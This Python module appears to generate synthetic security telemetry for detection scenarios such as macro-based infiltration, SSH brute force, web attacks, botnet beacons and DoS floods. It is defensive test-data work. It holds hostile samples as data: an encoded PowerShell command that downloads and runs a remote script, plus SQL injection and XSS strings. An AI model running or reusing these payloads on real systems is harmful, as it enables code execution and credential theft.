import os
import json
import csv
from datetime import datetime, timedelta
from typing import Dict, Any, List
from app.ingest.scenarios import SCENARIO_REGISTRY, ScenarioMetadata

DATASETS_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../../datasets"))
RAW_DIR = os.path.join(DATASETS_DIR, "raw")
NORMALIZED_DIR = os.path.join(DATASETS_DIR, "normalized")


def ensure_directories():
    os.makedirs(RAW_DIR, exist_ok=True)
    os.makedirs(NORMALIZED_DIR, exist_ok=True)


def generate_synthetic_scenario_events(scenario_id: str) -> List[Dict[str, Any]]:
    """Generates realistic synthetic telemetry for the scenario if raw downloads are absent."""
    scenario = SCENARIO_REGISTRY.get(scenario_id)
    if not scenario:
        raise ValueError(f"Unknown scenario: {scenario_id}")

    events = []
    base_time = datetime(2026, 9, 1, 10, 0, 0)

    if scenario_id == "infiltration":
        # 1. Benign background activity
        events.append({
            "timestamp": (base_time + timedelta(seconds=5)).isoformat() + "Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "host": "WORKSTATION-04",
            "user": "corp\\jdoe",
            "src_ip": "192.168.1.104",
            "dest_ip": None,
            "process_name": "chrome.exe",
            "command_line": '"C:\\Program Files\\Google\\Chrome\\chrome.exe" https://intranet.corp.local',
            "raw_log": {"EventID": 1, "ParentProcess": "explorer.exe"}
        })
        # 2. Suspicious Word macro execution
        events.append({
            "timestamp": (base_time + timedelta(seconds=20)).isoformat() + "Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "host": "WORKSTATION-04",
            "user": "corp\\jdoe",
            "src_ip": "192.168.1.104",
            "dest_ip": None,
            "process_name": "WINWORD.EXE",
            "command_line": '"C:\\Program Files\\Microsoft Office\\WINWORD.EXE" invoice_august.docm',
            "raw_log": {"EventID": 1, "ParentProcess": "explorer.exe"}
        })
        # 3. Word spawns PowerShell (T1059.001)
        events.append({
            "timestamp": (base_time + timedelta(seconds=23)).isoformat() + "Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "host": "WORKSTATION-04",
            "user": "corp\\jdoe",
            "src_ip": "192.168.1.104",
            "dest_ip": None,
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgAxADUALwBzAC4AcABzADEAJwApAA==",
            "raw_log": {"EventID": 1, "ParentProcess": "WINWORD.EXE"}
        })
        # 4. Outbound C2 connection (T1071)
        events.append({
            "timestamp": (base_time + timedelta(seconds=26)).isoformat() + "Z",
            "source": "cic_network_flow",
            "event_type": "network_connection",
            "host": "WORKSTATION-04",
            "user": "corp\\jdoe",
            "src_ip": "192.168.1.104",
            "dest_ip": "13.58.225.34",
            "process_name": "powershell.exe",
            "command_line": None,
            "raw_log": {"Dst Port": 443, "Protocol": 6, "Flow Duration": 120500, "Label": "Infiltration"}
        })
        # 5. Internal lateral port scan (T1046)
        for offset, target_ip in enumerate(["192.168.1.10", "192.168.1.15", "192.168.1.20"]):
            events.append({
                "timestamp": (base_time + timedelta(seconds=35 + offset * 2)).isoformat() + "Z",
                "source": "cic_network_flow",
                "event_type": "network_connection",
                "host": "WORKSTATION-04",
                "user": "corp\\jdoe",
                "src_ip": "192.168.1.104",
                "dest_ip": target_ip,
                "process_name": None,
                "command_line": None,
                "raw_log": {"Dst Port": 445, "Protocol": 6, "Flow Duration": 1500, "Label": "Infiltration"}
            })

    elif scenario_id == "brute_force":
        for i in range(8):
            events.append({
                "timestamp": (base_time + timedelta(seconds=i * 2)).isoformat() + "Z",
                "source": "winevent_auth",
                "event_type": "auth_failure",
                "host": "UBUNTU-SRV-01",
                "user": f"user_{i}",
                "src_ip": "18.218.115.60",
                "dest_ip": "192.168.1.10",
                "process_name": "sshd",
                "command_line": None,
                "raw_log": {"EventID": 4625, "FailureReason": "Unknown user or bad password"}
            })
        # Successful login
        events.append({
            "timestamp": (base_time + timedelta(seconds=20)).isoformat() + "Z",
            "source": "winevent_auth",
            "event_type": "auth_success",
            "host": "UBUNTU-SRV-01",
            "user": "admin",
            "src_ip": "18.218.115.60",
            "dest_ip": "192.168.1.10",
            "process_name": "sshd",
            "command_line": None,
            "raw_log": {"EventID": 4624, "LogonType": 10}
        })

    elif scenario_id == "web_attacks":
        payloads = ["' OR '1'='1", "UNION SELECT null, username, password FROM users--", "<script>alert(1)</script>"]
        for i, payload in enumerate(payloads):
            events.append({
                "timestamp": (base_time + timedelta(seconds=i * 5)).isoformat() + "Z",
                "source": "cic_network_flow",
                "event_type": "http_request",
                "host": "WEB-SRV-01",
                "user": "anonymous",
                "src_ip": "18.218.115.60",
                "dest_ip": "192.168.1.50",
                "process_name": "apache2",
                "command_line": f"GET /search.php?q={payload}",
                "raw_log": {"Dst Port": 80, "Protocol": 6, "Label": "Web Attack – SQL Injection"}
            })

    elif scenario_id == "botnet_c2":
        for i in range(5):
            events.append({
                "timestamp": (base_time + timedelta(seconds=i * 15)).isoformat() + "Z",
                "source": "cic_network_flow",
                "event_type": "c2_beacon",
                "host": "WORKSTATION-10",
                "user": "corp\\msmith",
                "src_ip": "192.168.1.110",
                "dest_ip": "18.219.211.138",
                "process_name": "ares_agent.exe",
                "command_line": None,
                "raw_log": {"Dst Port": 8080, "Protocol": 6, "Flow Duration": 500, "Label": "Bot"}
            })

    elif scenario_id == "dos_goldeneye":
        for i in range(12):
            events.append({
                "timestamp": (base_time + timedelta(seconds=i)).isoformat() + "Z",
                "source": "cic_network_flow",
                "event_type": "dos_flood",
                "host": "WEB-SRV-01",
                "user": None,
                "src_ip": "18.218.115.60",
                "dest_ip": "192.168.1.50",
                "process_name": "httpd",
                "command_line": None,
                "raw_log": {"Dst Port": 80, "Protocol": 6, "Flow Duration": 999999, "Label": "DoS attacks-GoldenEye"}
            })

    return events


def prepare_scenario(scenario_id: str) -> str:
    """Prepares raw scenario events on disk and returns the raw file path."""
    ensure_directories()
    scenario = SCENARIO_REGISTRY.get(scenario_id)
    if not scenario:
        raise ValueError(f"Unknown scenario: {scenario_id}")

    raw_path = os.path.join(RAW_DIR, scenario.raw_filename)
    events = generate_synthetic_scenario_events(scenario_id)

    with open(raw_path, "w", encoding="utf-8") as f:
        json.dump(events, f, indent=2)

    return raw_path
